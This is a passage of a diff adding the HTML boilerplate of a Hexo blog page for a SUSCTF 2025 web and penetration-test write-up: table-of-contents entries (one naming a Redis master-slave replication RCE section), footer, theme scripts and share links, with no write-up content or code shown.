class="toc-link" href="#pen4ruo1-3"><span class="toc-text">pen4ruo1-3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pen4ruo1-4"><span class="toc-text">pen4ruo1-4</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E4%BF%AE%E6%94%B9%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-text">直接修改配置文件</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pen4ruo1-5"><span class="toc-text">pen4ruo1-5</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6RCE"><span class="toc-text">redis主从复制RCE</span></a></li></ol></li></ol></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" target="_blank" rel="noopener" href="https://github.com/KaGty1">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2025 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+    <div class="footer-views">
+      
+      
+          本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+        
+      
+      
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + SUSCTF(2025)%20Web%20%26%26%20Panest%20Writeup + '&url=' + http%3A%2F%2Fkagty1.github.io%2Fctf_posts%2FSUS(2025)%2520CTF.html + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://kagty1.github.io/ctf_posts/SUS(2025)%20CTF.html" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
